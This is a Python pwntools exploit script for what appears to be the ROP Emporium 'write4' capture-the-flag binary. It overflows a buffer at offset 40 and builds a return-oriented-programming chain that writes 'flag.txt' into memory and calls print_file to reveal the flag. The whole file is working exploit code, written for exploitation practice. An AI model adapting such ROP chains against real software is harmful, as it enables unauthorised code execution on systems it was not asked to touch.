import time

from pwn import *


EXECUTABLE = "./write4"
context.binary = elf = ELF(EXECUTABLE)
lib_write4 = ELF("./libwrite4.so")


p = process(EXECUTABLE)
# gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr)
    log.success(f"Offset found: {offset}")
    exit()


rop = ROP(elf)

mov_ptr_r14 = 0x400628
flag_addr   = 0x601040

payload  = b"A" * OFFSET
# Load string "flag.txt" into memory
payload += p64(rop.r14_r15.address) + p64(flag_addr) + b"flag.txt"
payload += p64(mov_ptr_r14)
payload += p64(rop.r14_r15.address) + p64(flag_addr + 8) + p64(0)
payload += p64(mov_ptr_r14)

# Load memory address into rdi
payload += p64(rop.rdi.address) + p64(flag_addr)
# Call print_file
payload += p64(elf.plt.print_file)


p.sendafter(b"> ", payload)
p.recvline()

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
